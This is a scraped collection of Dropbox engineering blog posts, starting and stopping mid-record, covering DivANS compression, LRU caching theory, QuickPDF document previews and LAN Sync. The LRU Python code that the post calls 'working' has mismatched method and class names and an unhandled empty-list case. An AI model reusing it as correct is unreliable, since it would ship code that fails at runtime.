to the LZMA codec to produce the standard DivANS IR in its compression routine. Then we wrote a script to interleave the hints from Brotli with the IR from LZMA. The result from mashing up the Brotli and LZMA IR’s improves the overall compression of DivANS beyond the the other algorithms in Silesia. Automating and productionizing this technique would be likely to improve both compression speed and ratio in aggregate. Updated DivANS compression ratios with LZMA+Brotli hybrid IR Closing Thoughts Research directions The DivANS system today is already able to get a better compression ratio than alternatives on Dropbox data (albeit with a performance cost). However, we are even more excited about opening up the code and the DivANS Intermediate Representation (IR) to the world. We hope that by lowering the bar for creating new compression algorithms, the community can focus compression research on three separate directions: creating efficient IR representations of raw files in significantly less time than DivANS optimizing IR representations encoding IRs into efficient bit representations Using Rust: fast, reliable, productive: pick 3 DivANS is written in the Rust programming language , since Rust has guarantees about safety, security, and determinism in the safe subset of the language. Rust can also be as fast as hand-tuned C code and doesn’t need a garbage collector. Rust programs embed well in any programming language that support a C foreign function interface (FFI) and even allow runtime selection of the memory allocator through that C FFI. These properties make it easy to embed the DivANS codec in a webpage with WASM, as shown above. Rust also recently added support for SIMD intrinsics and has intuitive, safe support for multithreading, colloquially called “ fearless concurrency ”. We use vector instructions to manipulate the CDFs. We decode the IR commands and the literals themselves each on separate threads. The entire multithreading initiative was started after the decompressor was completely written, and it leaned heavily on rustc‘s guidance to refactor the code into independent halves. Call to action Ideally, several disparate algorithms would generate DivANS IR (not just Brotli, and not just in Rust), and ideally other compression algorithms could also take the DivANS IR as input and produce an efficient bitstream from that input. Pull requests welcome! // Tags Infrastructure Lepton Ir Open Source Ans Compression Divans // Copy link Link copied Link copied", "date": "2018-06-19"},
{"website": "Dropbox", "title": "Caching in theory and practice", "author": ["Pavel Panchekha"], "link": "https://dropbox.tech/infrastructure/caching-in-theory-and-practice", "abstract": "Caches Competitive Analysis Caching Algorithms The Most Recently Used and the Least Recently Used Algorithms Least Frequently Used So, Why LRU? Caching Algorithms in Practice Loose Ends Conclusions Footnotes Hello, my name is Pavel Panchekha. I was an intern at Dropbox back in ’11, and one thing I’ve investigated are various caching algorithms. The Dropbox mobile client caches frequently-accessed files, so that viewing them doesn’t require a network call. Both our Android and iOS clients use the LRU caching algorithm, which often selects good files to cache. But while this is the usual algorithm for caching, I wondered: are there better algorithms, and if not, why is LRU the best option? Caches Let’s formalize the problem. We have a large set of files, and we’d like an algorithm to determine which (k) files to keep at any point. We’re assuming all files have the same size. In fact, Dropbox stores files in 4MB blocks, so this simplification isn’t too far off (we’ll see later how to avoid it). To determine which files to keep, every time we want to use a file, we tell the cache to fetch it for us. If the cache has a file, it will give us its copy; if not, the cache has to fetch the new file, and it might also want to remove a file from its cache to make room for the new file. Note also that we’re stuck with an on-line algorithm: we can’t predict what files a user will want in the future. The cache needs to be fast, along two metrics. First, The cache should ensure that as many of the requests for files go to it (cache hit), not over the network (cache miss). Second, the overhead of using a cache should be small: testing membership and deciding when to replace a file should be as fast as possible. Maximizing cache hits is the goal of the first part of this post; quickly implementing the cache will be the topic of the second part. Competitive Analysis How do we measure the worst case number of cache misses? Unlike a normal algorithm, our runtime is driven by the user’s actions. So our worst-case performance corresponds to our worst-case user: one who maximally breaks our cache at every step. But a pure adversarial analysis won’t work, since a user can always make our cache perform badly by just requesting lots of files –eventually, some of them won’t be cached. The key is to compare how well our algorithm performs with how well our algorithm could possibly perform. We need some benchmark. Zero cache misses is a lower bound but is usually impossible. So instead, let’s compare our algorithm with one that can “plan ahead” perfectly: let’s compare our algorithm – which at any point only has the requests from the past – with some sort of optimal magic “future-seeing” algorithm. More specifically, we’re going to find the ratio of cache misses from our algorithm to the number of cache misses for the optimal algorithm. And then we’re going to try to minimize this ratio across all possible sequences of file requests from the user. Generally, we’ll argue that the algorithm we’re analyzing will have at most (A) misses during any particular sequence of instructions, during which the optimal algorithm must have at least (O) misses; thus the “competitive ratio” is at most (A / O). This type of analysis is called competitive analysis . In general, our method will be to pick a sequence that a chosen algorithm performs very poorly on. We find how many cache misses, (A), that algorithm sees for that sequence of requests. Usually, we’ll be able to calculate (A) precisely. Then, we’ll try to think up the cleverest possible way to cache files for that specific sequence; the number of cache misses we see we’ll call (O). We’ll usually find some possible way of caching files and calculate the number of cache misses for that, so we’ll get an upper bound on (O). The competitive ratio is (A / O), and since we had an upper bound on (O), we get a lower bound on the competitive ratio. Furthermore, our algorithm could perform even worse on a different sequence, so (A / O) is definitely a lower bound. This lets us say that some algorithm is really bad, but doesn’t let us say that some algorithm is really good. We’ll also prove some upper bounds on the competitive ratio, which will let us claim that some algorithms are optimal. Together, these will give us a way to compare caching algorithms. Caching Algorithms Before we go ahead to analyze a bunch of caching algorithms, we need caching algorithms to analyze. So let’s quickly list a bunch of popular ones: Most Recently Used When we need to get rid of a file, we trash the one we just recently accessed. This algorithm incorporates information about how often a file is accessed in a perverse way – it prefers to keep around old data that is rarely used instead of data that is frequently accessed. But if you use many files, without using the same files over and over again (such as, say, when viewing a photo gallery), this algorithm works very well, since you’re kicking out files you’re unlikely to see again. In effect, browsing through a complete photo gallery can take up only one “slot” in the cache, since each access you kick out the previous photo in that gallery. Least Recently Used When we need to get rid of a file, we get rid of the one we haven’t used in the longest time. This only requires keeping the access order of the files in the cache. By keeping files that we’ve recently accessed, it too tends to keep around files used more often; on the other hand, if a user’s interest changes, the entire cache can relatively quickly become tuned to the new interests. But this cache tends to work poorly if certain files are accessed every once in a while, consistently, while others are accessed very frequently for a short while and never again. Least Frequently Used When we need to get rid of a file, we get rid of the one that is least frequently used. This requires keeping a counter on each file, stating how many times it’s been accessed. If a file is accessed a lot for a while, then is no longer useful, it will stick around, so this algorithm probably does poorly if access patterns change. On the other hand, if usage patterns stay stable, it’ll (we hope) do well. This is a nice batch of the more common and simple caching algorithms, so let’s look at how we perform using the competitive analysis above. The Most Recently Used and the Least Recently Used Algorithms We can easily construct sequences to stump the Most Recently Used algorithm. For example, consider the sequence of file accesses (1, 2, dots, k, k+1, k, k+1, k, dots). Most Recently Used will kick out (k) to make room for (k+1), then kick out (k+1) to make room for (k), and so on. It will have a cache miss on every file lookup for this sequence of files. And it’s so easy to do better: an optimal algorithm might, for example, kick out (1) to make room for (k+1), and never have a cache miss after that (since both (k) and (k+1) are in the cache after that). The optimal algorithm sees at most (k+1) cache misses, while Most Recently Used sees (N) cache misses, making it ((N / (k+1)))-competitive. Since we can make (N) as large as we want, this can be arbitrarily large – we might call the Most Recently Used algorithm (infty)-competitive. So, really bad. The Least Recently Used algorithm is better. For example, on that input sequence, it does precisely what the optimal algorithm might do. But it still doesn’t do that well. Imagine if our sequence of requests is for files (1, 2, dots, k, k+1, 1, 2, dots, k, k+1, dots). The Least Recently Used algorithm will miss every time, since for every request, the file requested was just kicked out. And the optimal algorithm can always just swap for the most-recently-requested file. So first, it would fail to find (k + 1) in the cache and replace (k) with it. Then it would fail to find (k) and replace (k – 1) with it. Then (k – 1) with (k – 2), and so on. This yields one cache miss every (k) requests; so if there are (N) requests total, the optimal algorithm would face (k + frac{N}{k}) failures (the “k” for populating the cache with (1, dots, k)), while the Least Recently Used algorithm would face (N) failures. Thus the Least Recently Used algorithm is at best (N / (k + (N / k)))-competitive, which for large (N) works out to be (k)-competitive. This doesn’t show that the Least Recently Used algorithm is (k)-competitive; it tells us that the Least Recently Used algorithm isn’t better than (k)-competitive. But with a bit more effort, we can prove that the Least Recently Used algorithm is precisely (k)-competitive. To do that, we’ll have to make an argument about all possible input sequences. The core of the proof is to look at what must happen for LRU to fail. If the Least Recently Used algorithm has (k+1) cache misses, it must be because (k+1) new files were requested. But if this happens, at least one of those files wasn’t in the cache that the optimal algorithm had (since it, too, can only cache (k) files). To capture this property precisely, let’s divide the sequence of files into phases – during each phase, only some (k) specific files are requested. LRU may fail on at most each of these new files before they are all in the cache – at most (k) times. Meanwhile, the optimal algorithm fails at least once, since at least one of those files isn’t yet in the cache (if they all are, then we never ended the previous phase). So LRU is precisely (k)-competitive. This doesn’t sound that good. In a way, the larger our cache, the less impressively LRU performs. But in fact, our argument that Least Recently Used is (k)-competitive is applicable to any algorithm for which we can predict what files it will cache. So while (k) times worse than perfect seems pretty poor, it is in fact the best we can do (unless we use randomized algorithms; I’ll discuss why not to do that in a bit). LRU only made use of very basic timing information. A smarter algorithm, you might imagine, might actually maintain some popularity information: which files you use often, and which more rarely. Does it do any better? Least Frequently Used It seems that Least Frequently Used should do much better than LRU, since it incorporates actual information about how popular various files are, instead of just timing information. But let’s do the analysis proper, just in case. To make LFU perform poorly, we’d need to make it keep switching between two files, each time kicking one out to make room for the other. This might happen if we use, say, files (1, 2, dots, k-1) very frequently, and files (k) and (k+1) infrequently, but equally so. If we just request (1, dots, k-1) once or twice and then alternate between (k) and (k+1), this isn’t too much of a problem, since eventually both (k) and (k+1) will be more frequently used than (1, dots, k-1) and will both be cached. But if we first use (1, dots, k-1) a bunch, so that neither (k) nor (k+1) are ever more popular than them, we can create a lot of cache misses. What we are setting up is a case where usage patterns change. First, we used (1) through (k-1) a lot, and then we changed to using (k) and (k+1) a lot. An example such sequence requests (1, dots, k-1) (N) times, and then alternates between (k) and (k+1) (N) times. Both (k) and (k+1) are less frequently used than any of (1, dots, k-1), so each is kicked out to make room for the other. This leads to (k-1) cache misses to load (1) through (k-1) into the cache, and then (2N) cache misses for the requests to (k) and (k+1). On the other hand, the optimal algorithm could do so much better. For example, it could kick out (1) to make room for (k+1) when it stops being used, leading to (k+1) total cache misses. So the LFU algorithm had (2N + k – 1) misses, and the optimal algorithm had (k + 1). The quotient of these can be made arbitrarily large by increasing (N), so LFU can be arbitrarily bad. This result is curious. LFU semi-intelligently made use of popularity data, but fared so much worse than LRU, which just made use of basic timing data. But, the cases that make LFU perform poorly are relatively real-world. For example, suppose you have a large project that you’re working on, and then you finish said project and no longer access those files. Your cache would be storing those old files instead of the new ones you’re using. So our analysis told us something surprising: that LFU, which looked so promising, could actually be absurdly bad, in perhaps real-world situations. In fact, if you think about it, LRU does make some use of popularity information. If a file is popular enough to be used more often than once every (k) times, it will always be in an LRU cache. But by forgetting any information more than (k) files ago, the LRU algorithm prevents really old files from taking precedence over new ones. So, Why LRU? You’d think it’d be possible to combine the best of LRU and LFU to make an algorithm that performs better than either. Turns out, yes and no. When we proved LRU no better than (k)-competitive, we choose a sequence where the next file requested was always the file not in the cache. But we can do this for any deterministic algorithm! This means that the worst-case behavior of any deterministic algorithm is guaranteed to be no better than (k)-competitive. But in a practical sense, better algorithms do exist. For reference, the ARC 1 and CAR 2 algorithms tend to outperform Least Recently Used caches. Of course, each has the same worst-case behavior that the Least Recently Used algorithm has, but they manage to trade off between frequent and recent items in a way that often leads to better performance in practice. Of course, both are more complex than the Least Recently Used algorithm. We can get around the theoretical deficiencies of deterministic algorithms – that the user can predict which files aren’t in the cache and thus keep requesting those – by having our algorithm make partially-random choices. This will make it harder for users to hit the worst case, but it often makes the algorithm perform worse in practice. The best a randomized algorithm can do is (O(log k)) (in fact, approximately the natural log of (k)); see Fiat et al. 3 . Randomized caching algorithms have the downside of behaving in unexpected ways for the user – “Why is that file taking so long to open, I just looked at it!”. So in practice, they’re rarely used. Tangent: while randomized algorithms cannot be used directly in practice, they do tell us something about the expected performance of deterministic algorithms. This comes from a beautiful theorem by John von Neumann, called the Minimax Theorem. Imagine that the algorithm designer and his adversary play a game: the designer chooses a caching algorithm, the adversary a sequence of files, and then the winnings are decided based on how many cache misses the cache had. Phrased this way, algorithm design falls under the purview of game theory. We can represent a randomized algorithm as a strategy that involves choosing an algorithm at random from some set, and we can represent a randomized sequence of files as a random choice from a set of possible sequences. Continuing the tangent, let’s consider what the Minimax Theorem tells us about this game. The Minimax Theorem tells us that there exists an equilibrium strategy, where the worst-case winnings for each player is maximized. Since they’re the worst-case winnings for each player, they’re minimum winnings, so we have a minimum maximized – hence the theorem’s name. Such an equilibrium strategy might be a randomized strategy. In fact, since randomized algorithms can deliver guaranteed (O(log k)) performance, better than any deterministic algorithm, we might suppose that the maximum worst-case winnings for the adversary are at most (O(log k)). Similarly, the adversary will likely want to play some manner of randomized input sequence, since otherwise there would be added structure for a cache to possibly extract. Still on tangent, note that if the algorithm designer is committed to a randomized algorithm, there may be no reason to play a randomized input sequence. This is a consequence of the second part of the Minimax Theorem (which, sadly, is not as well-known): if one player is committed to a strategy, there is an optimal, deterministic response, which attains results at least as good as those from the equilibrium strategy. In particular, if the randomized algorithm being used is well-known, there must be a sequence of inputs that has the most expected cache misses; but this can’t take longer than with a randomized input sequence (otherwise, we would have chosen this deterministic sequence as our “randomized” one). But we can turn this around: if the input sequence is pre-chosen, there is an optimal deterministic response. This option better describes the usual human user, who will not actively try to thwart the Dropbox caching algorithm, but simply accesses files in a normal fashion. In this case, the sequence of files is random and pre-determined, so there is an optimal deterministic response. And the expected number of cache misses from such is at most (O(log k)). So a good deterministic algorithm, while it has a worst-case competitiveness of (O(k)), may have an expected competitiveness of at most (O(log k)). And, in fact, LRU is one of these good deterministic algorithms. Another way to convince yourself that the (k)-competitiveness of LRU is not that bad is compare an LRU cache not with an optimal cache of the same size, but with an optimal but smaller cache. In this case, you can prove a better result. For example, an LRU cache is at most twice as bad as an optimal cache half its size. Compared to an optimal cache of 100 files, an LRU cache for 200 files is at most twice as bad. Overall, the caching algorithm you want to use is usually LRU, since it is theoretically very good and in practice both simple and efficient. For example, the Dropbox iOS and Android clients both use LRU caches. The Linux kernel uses a variant called segmented LRU . On to some code. Caching Algorithms in Practice Our LRU implementation needs to do two things quickly. It needs to access each cached page quickly, and it needs to know which files are most and least recent. The lookup suggests a hash table, maintaining recency suggests a linked list; then each step can be done in constant time. A hash table can point to its file’s node in the list, which we can then go ahead and move around. Here goes. Copy class DoubleLinkedNode:\r\n    def __init__(self, prev, key, item, next):\r\n        self.prev = prev\r\n        self.key = key\r\n        self.item = item\r\n        self.next = next\r\n \r\nclass LRUCache:\r\n    \"\"\" An LRU cache of a given size caching calls to a given function \"\"\"\r\n \r\n    def __init__(self, size, if_missing):\r\n        \"\"\"\r\n        Create an LRUCache given a size and a function to call for missing keys\r\n        \"\"\"\r\n \r\n        self.size = size\r\n        self.slow_lookup = if_missing\r\n        self.hash = {}\r\n        self.list_front = None\r\n        self.list_end = None\r\ndef get(self, key):\r\n    \"\"\" Get the value associated with a certain key from the cache \"\"\"\r\n \r\n    if key in self.hash:\r\n        return self.from_cache(key)\r\n    else:\r\n        new_item = self.slow_lookup(key)\r\n \r\n        if len(self.hash) >= self.size:\r\n            self.kick_item()\r\n \r\n        self.insert(key, new_item)\r\n        return new_item To look up an item that's already in the cache, we just need to move its node in the list to the front of the list. Copy def from_cache(self, key):\r\n    \"\"\" Look up a key known to be in the cache. \"\"\"\r\n \r\n    node = self.hash[key]\r\n    assert node.key == key, \"Node for LRU key has different key\"\r\n \r\n    if node.prev is None:\r\n        # it's already in front\r\n        pass\r\n    else:\r\n        # Link the nodes around it to each other\r\n        node.prev.next = node.next\r\n        if node.next is not None:\r\n            node.next.prev = node.prev\r\n        else: # Node was at the list_end\r\n            self.list_end = node.prev\r\n \r\n        # Link the node to the front\r\n        node.next = self.list_front\r\n        self.list_front.prev = node\r\n        node.prev = None\r\n        self.list_front = node\r\n \r\n    return node.item To kick an item, we need only take the node at the end of the list (the one that's least recently used) and remove it. Copy def kick_item(self):\r\n    \"\"\" Kick an item from the cache, making room for a new item \"\"\"\r\n \r\n    last = self.list_end\r\n    if last is None: # Same error as [].pop()\r\n        raise IndexError(\"Can't kick item from empty cache\")\r\n \r\n    # Unlink from list\r\n    self.list_end = last.prev\r\n    if last.prev is not None:\r\n        last.prev.next = None\r\n \r\n    # Delete from hash table\r\n    del self.hash[last.key]\r\n    last.prev = last.next = None # For GC purposes Finally, to add an item, we can just link it to the front of the list and add it to the hash table. Copy def insert_item(self, key, item):\r\n    node = DoublyLinkedNode(None, key, item, None)\r\n \r\n    # Link node into place\r\n    node.next = self.list_front\r\n    if self.list_front is not None:\r\n        self.list_front.prev = node\r\n    self.list_front = node\r\n \r\n    # Add to hash table\r\n    self.hash[key] = node There it is, a working, (k)-competitive, LRU cache. Loose Ends You'll note that we've been assuming so far that all files are the same size. But in practice, this is of course untrue. How do we deal with bigger and smaller files? Well, it turns out, Dropbox naturally subdivides files into blocks (4MB big files, in fact). So instead of caching particular files, we can cache particular blocks, which are close enough in size that the Least Recently Used algorithm above works. Equivalently, we just kick out files until there is enough room for whatever file we want to load. Another problem that a real-world cache needs to solve is the issue of cache invalidation – that is, since the files we are caching can change on the server, how do we tell that our cache is out of date? A simple way is to always download an index, which tells you the file's revision number, but not the file data itself. You can do this on a per-directory basis, so that it's not too much data by itself. Then every time you find a file in the cache, you simply check when your copy was last modified and when the server's copy was last modified. This lets you know whether to renew your copy. Going even further, you can cache these indices for each directory, and use the same logic to determine whether they need to be downloaded again. This is what the Android and iOS clients do. Conclusions Caches can be used in front of any slow part of your application -- communication over a network, reads from disk, or time-intensive computation. Caching is especially important in mobile programs, where network communication is often both necessary and costly, so it's good to know the theory and do it right. Luckily, the best solution for caching problems is usually the Least Recently Used algorithm, which is both efficient and simple to implement. Thanks to Dan Wheeler, Tido the Great, Aston Motes, Albert Ni, Jon Ying, and Rian Hunter for proofreading. Footnotes 1 N. Megiddo & D. Modha (2003), \"ARC: A Self-Tuning, Low Overhead Replacement Cache\" 2 S. Bansal & D. Modha (2004), \"CAR: Clock with Adaptive Replacement\". 3 A. Fiat, R. Karp, M. Luby, M. McGeoch, D. Sleator & N. Young (1991), \"Competitive paging algorithms\". // Tags Infrastructure Caching Performance // Copy link Link copied Link copied", "date": "2012-10-16"},
{"website": "Dropbox", "title": "Improving Document Preview Performance", "author": ["Jingsi Zhu"], "link": "https://dropbox.tech/infrastructure/improving-document-preview-performance", "abstract": "Introduction Background Establishing Content Prioritization Speeding Up First Page View Moving to Server-Side Rendered Preview Hacking an alternative to PDF.js Implementing QuickPDF Results Conclusion Credits Introduction Ever open a file on dropbox.com , or click a shared link your coworker sent you? Chances are you didn’t need to download the file to see it—you saw it right in the browser. This is the work of the Previews team at Dropbox. Previews are part of the core Dropbox experience. They allow architects to access their entire portfolios on dropbox.com while at the job site to show their work. Designers can send work-in-progress to clients without worrying about whether they have the correct software installed. Office managers can review, comment, and annotate new office design proposals, regardless of the file format. For many users, a preview is their first interaction with Dropbox. Close to half of the previews we serve are documents (in formats including PDF, Microsoft Office, and Open Office). Unlike images, documents need to have a preview generated. This can take time. Our users want to see their content as soon as possible, so we have to provide great performance. Over the last year, the Previews team has been on a journey to make our document preview experience the fastest in the industry, and we’re happy to share what we learned. Background At Dropbox, all documents are converted to PDFs before being previewed. This preserves as much detail from original files as possible, while achieving compatibility on all clients. Our sibling team, Previews Infra, manages a large fleet of servers that handles file format conversion for us. Thanks to their work, our task is reduced to figuring out how to display PDF documents in the browser as fast as possible. Early versions of Dropbox directly embedded the PDF on the web page and relied on the browser to render the file. PDF renderers in browsers tend to have very good performance and high fidelity. However, the downsides were significant. We had very little control over the look and feel of PDF viewers. This made it hard for us to achieve a consistent user experience across browsers. More importantly, we had no ability to add collaborative features like comments, annotations or highlighting. To address these shortcomings, we replaced the direct embedding method with a JavaScript open-source PDF renderer, PDF.js. This change allowed us to build annotations on previews, and let browsers without PDF viewers—most notably Internet Explorer—see the preview. We also built a consistent user interface across all the file formats we support. However, moving to PDF.js led to significant performance problems. Not only did the client need to download and execute the entire JavaScript bundle, we also needed to download the entire PDF file to successfully preview it. Establishing Content Prioritization Our File Preview is a monolithic Single Page Application, implemented in React. Most of our business logic is implemented client-side in JavaScript. As a consequence, seeing a document preview requires downloading and executing the entire JavaScript bundle, and then downloading and executing the PDF.js JavaScript code. Only then can we download the PDF and render it. This is highly inefficient. However, it is very hard to parallelize these operations, because JavaScript is single-threaded. Executing PDF.js code would block our executing code, and vice versa. For the user, previews aren’t just a core experience—they’re critical. This means it’s paramount for us to render them first, even at the expense of delaying collaborative features such as commenting. To speed up previews we implemented content prioritization: showing the preview first. Using Server-Side React, we render a skeleton web page on the server using an iframe that loads the document preview. Then on the client side, the JavaScript waits to execute until the document preview inside the iframe has successfully loaded. This approach, while simple, is highly effective. We saw a large drop in our Time to Interactive (TTI), a metric defined as when the user can interact with the document. Speeding Up First Page View While content prioritization was quite successful, it still took a long time to download the full document and PDF.js. Further performance improvement required us to explore approaches beyond PDF.js. Speed is paramount For users to perceive a preview as fast, you have to show them something as quickly as possible. Taking as an example iOS apps that display a screenshot before actual functionalities are fully loaded, we wondered if it would be enough to simply display a high-resolution thumbnail of the first page until the document was downloaded and rendered. This idea turned out to perform very well in real world usage. It dramatically reduced the perceived slowness of the preview. Later, we began to automatically load and render thumbnails for subsequent pages as the user scrolls. Aside from not being interactive, thumbnails have very little difference from the actual previews rendered with PDF.js. Moving to Server-Side Rendered Preview Beyond performance improvements, our First Page View work gave us validation for another idea we had pondered for a long time: Server-Side Rendered Previews. Although using PDF.js represented a huge improvement over embedding the PDF directly, it also brought a number of challenges. First of all, integrating PDF.js with Dropbox was quite difficult, if not downright hacky. PDF.js was designed to be Firefox’s integrated PDF viewer, rather than a component of another product, so it provided limited support for our use case. Furthermore, PDF-based exploits are extremely common, so we decided to put PDF.js into an iframe on a separate domain, so that malicious PDFs could not access cookies on dropbox.com . This dramatically complicated our build and deploy process. It also necessitated a cumbersome postMessage call for communication between PDF.js and the main frame. More importantly, performance-wise, PDF.js left a lot to be desired. PDF is an incredibly complex file format—the specification is more than a thousand pages long, not including the extensions and supplements. Thus the PDF.js implementation is highly elaborate, which resulted in long download and execution time, and there is little we can do to improve it. For some time, the team had entertained the possibility of moving the render pipeline to the server side. This would allow us to transfer only the part of the document visible to the user, dramatically improving TTI. Hacking an alternative to PDF.js Because we had been using PDF.js for a long time, it was natural to first explore simply moving it to the server. Unfortunately, running PDF.js with Node results in poor image rendering quality. Not acceptable. The proposed alternative was running PDF.js in Chrome. At Dropbox, binaries are executed in a jailed environment and only whitelisted system calls are allowed. While borderline paranoid, this approach has saved us from zero-day vulnerabilities in third-party libraries we rely on. To move forward we needed to get hacking. Dropbox maintains a great tradition for getting back to our innovative roots. Every year we hold an in-house hackathon aptly named Hack Week. During Hack Week most company employees pause regular work and focus on any project they wish. However, projects that move the company forward are encouraged. During the 2017 Hack Week, I experimented with using PDFium as a Previews backend. PDFium is the engine that powers Chrome’s PDF Viewer, and is based on the battle-tested Foxit PDF SDK. However, since it is designed for client use, it wasn’t clear whether PDFium would be suitable for server-side usage. Ultimately, I put together a prototype that was much faster than our PDF.js based viewer. At the Hack Week presentation expo it earned the Cornerstone award for a project that makes significant contributions to Dropbox’s foundation, be it product stability, trustworthiness, or performance. The team then began comparing the benefits and risks of the two approaches. It soon became clear that PDFium allowed us to do a lot better than PDF.js. We could build a PDF viewer from scratch, designed specifically for Dropbox, and it would be secure, fast, and easy to develop. The render quality of PDFium surpasses PDF.js on many documents, especially those that use obscure PDF features. Extracting text as well as positioning it correctly is trickier than with PDF.js, but still feasible. We decided to go all in on PDFium with a project called QuickPDF. Implementing QuickPDF QuickPDF consists of two components: a server-side renderer that splits the PDF into parts, and a client-side viewer that reconstructs the file from those parts and displays them in the browser. The two parts are intentionally decoupled, in case we find a better solution than PDFium. On the server side, we wrote a statically-linked binary in C++ that uses a modified version of PDFium to render each page of the PDF as a PNG image. It parses the metadata, including the page number and page dimensions, and serializes them as JSON. It also extracts the text and positioning information by grouping adjacent characters with the same font and size on the same line into text boxes. Each text box is represented by an object that stores the text, position, width, font size, and font family. The binary is executed by our file conversion system inside the secure jail, and the results are cached. The client side is a React application. It fetches the document metadata. Using page count and page size, it draws a skeleton of the document on screen. As the user scrolls, it fetches the pages visible from the server. Each page consists of an image and a transparent layer of text that enables text selection. Hot Areas—implemented in PDF as Annotations—are also rendered, to enable clickable links. Drawing the text overlay accurately is the most difficult part. Without enough precision, the text selection can be flaky. To make matters worse, the user can freely zoom the page, complicating the positioning. After some careful study of the PDF Standard, we decided to draw the text layer at 72 DPI, the native resolution of PDF, and scale up or down as required. For each text box, we use the original font when available, and substitute a similar one otherwise. The text is then created at the specified size. After the box is drawn on screen, the width is measured and the entire box is stretched to the width specified. This also takes care of different kerning. The box is then rotated and translated to its position on the page. To make sure the application was fast enough, the team employed multiple optimization techniques. Requests for text and metadata are batched as much as possible. Pages are “over scanned,” i.e. we render more pages than are currently visible, so that the user doesn’t have to wait for a page to download. Since text overlay rendering is expensive, we defer it until the user is no longer scrolling. Using these techniques, we are able to achieve a butter-smooth experience across all supported browsers. Results QuickPDF proved to be a huge success. Our 75th-percentile Time to Interactive was reduced by half. The biggest improvement came with PowerPoint files. These files embedded with high-resolution graphics and video are very large. Previously, a significant percentage of our users would leave the preview before it could be rendered. After implementing QuickPDF our PowerPoint preview success rate dramatically improved through lower abandonment. Conclusion The methods above are the ones that worked for us. Needless to say, we also experimented with several approaches that didn’t work so well. Through trial-and-error the team learned a lot of valuable lessons that we believe apply to everyone who cares about performance. Challenge Assumptions. Before Hack Week, nobody thought PDFium could be a viable alternative to PDF.js. This suspicion didn’t go away until the prototype demonstrated its potential. Assumptions are dangerous; they discourage radical ideas. Some of our most effective measures, including showing the thumbnail first and deferring JavaScript, sounded crazy on paper. Only metrics speak for themselves. Measure. Measure. Measure. In early stages of development we suffered from a lack of reliable metrics. Different loggers returned conflicting results, and we didn’t have a detailed breakdown to guide our optimization efforts. As we rolled out different experiments and fixed the logging, we realized that the lack of historical data made it very hard to measure effectiveness. After that discovery, logging became the top priority for each project. Define Metrics and Goals Carefully. While we decided early on to optimize for 75th-percentile Time to Interactive (p75 TTI), it took us some time to define, scientifically, what this metric would represent. For example, how would we define interactive? Should we measure Cold Starts, i.e. new users, and Warm Starts, i.e. those who had visited the site previously, and thus have most of our resources cached separately? What would the 75th-percentile cover, hours, days, or weeks? Due to limitations of our early logging, the number we reported was a weighted average of p75 across different file formats. Is this acceptable? Having exact agreement on what the different elements of each metric means is crucial, both to having engineers on the same page, and also for communicating with external stakeholders. Credits Improving performance is a never-ending task, and it involves every part of the engineering stack, from JavaScript frontend to infrastructure and network. There are many coworkers whose advice along the way helped us achieve these amazing results. On behalf of the team I would like to express our most sincere gratitude. // Tags Infrastructure Web Performance Web Previews Quickpdf // Copy link Link copied Link copied", "date": "2017-12-01"},
{"website": "Dropbox", "title": "Inside LAN Sync", "author": ["Matt Dee"], "link": "https://dropbox.tech/infrastructure/inside-lan-sync", "abstract": "Blocks and Namespaces Where does LAN Sync Fit In? Can I Use It? Dropbox LAN Sync is a feature that allows you to download files from other computers on your network, saving time and bandwidth compared to downloading them from Dropbox servers. Imagine that you are at home or at your office, and someone on the same network as you adds a file to a shared folder that you are a part of. Without LAN Sync, their computer would upload the file to Dropbox, and then you would download the file from Dropbox. With LAN Sync, you can download the file straight from their computer. Since you are on the same network, this transfer will be much faster and will save you bandwidth. As the number of companies and offices using Dropbox has increased, the use cases for LAN Sync have grown, and the feature was recently rewritten and improved. Here’s a look inside how it works. Blocks and Namespaces First, we need to talk about some of the abstractions that Dropbox uses internally, namely blocks and namespaces. If you’ve read other articles on the tech blog, you may already be familiar with these. Files in Dropbox are split up into 4MB blocks, where the last block is smaller when the file size is not evenly divisible by 4MB. Each block is addressed by the SHA-256 hash of its contents. A file, then, can be described by the list of hashes of blocks that make it up. Here, the file could be described as 'h1,h2,h3,h4', where h1, h2, etc. are the hashes for their respective blocks. Namespaces are the primitive behind Dropbox's permissions model. They can be thought of as a directory with specific permissions. Every account has a namespace which represents its personal Dropbox account and all the files in it. In addition, shared folders are namespaces which multiple accounts can have access to. Where does LAN Sync Fit In? The key takeaway from the last section is that file download requests can be thought of a series of (hash, namespace) requests, indicating to download the given block, authenticated as the namespace. Without LAN Sync, these requests would be queued up and sent to the block server, which would return block data. This is a nice abstraction, because this way the block download pipeline does not need to know about filenames or how the blocks fit together. This also means that LAN Sync only syncs actual file data, and not file metadata, such as filenames. By ensuring that all metadata is received from Dropbox’s servers, we can ensure that everyone is always in a consistent state. With LAN Sync, we try to download blocks directly from peers on the LAN first, using block server only if that fails. Given a block and a namespace, the interface to LAN Sync either returns the block or an indicator that it was not found. ARCHITECTURE There are three main components of the LAN Sync system that run on the desktop app: the discovery engine, the server, and the client. The discovery engine is responsible for finding machines on the network that we can sync with (i.e., machines which have access to namespaces in common with ours). The server handles requests from other machines on the network, serving requested block data. The client is responsible for trying to request blocks from the network. DISCOVERY ENGINE The first challenge about LAN Sync is finding other machines on the LAN to sync with. To do this, each machine periodically sends and listens for UDP broadcast packets over port 17500 (which is reserved by IANA for LAN Sync). These packets contain: The version of the protocol used by that computer The namespaces supported The TCP port that they are running the server on (17500 is reserved, but that is no guarantee that it will be available, so we may bind to a different port) A random identifier. We could identify requests by IP address, but it is hard to avoid connecting to ourselves or to avoid seeing the same peer twice just using that (we may get their packets over multiple interfaces, for example). When a packet is seen, we add the IP address to a list for each namespace, indicating a potential target. PROTOCOL The actual block transfer is done over HTTPS. Each computer runs an HTTPS server with endpoints of the form '/blocks/[namespace_id]/[block_hash]'. It supports the methods GET and HEAD. HEAD is used for checking if the block exists (200 means yes, 404 means no), and GET will actually retrieve the block. HEAD is useful in that it allows us to poll multiple peers to see if they have the block, but only download it from one of them. Because Dropbox aims to keep all of your data safe, we want to make sure that only clients authenticated for a given namespace can request blocks. We also want to make sure that computers cannot pretend to be servers for namespaces that they do not control. The concern here is not that they might try to give you bad data (we can check for that by ensuring that it hashes to the right thing) but rather that they might be able to learn something by watching which block hashes you request. The solution to this is to use SSL in a creative way. We generate SSL an key/certificate pairs for every namespace. These are distributed from Dropbox servers to user’s computers which are authenticated for the namespace. These are rotated any time membership changes e.g., when someone is removed from a shared folder. We can require both ends of the HTTPS connection to authenticate with the same certificate (the certificate for the namespace). This proves that both ends of the connection are authenticated. One interesting problem: when making a connection, how do we tell the server which 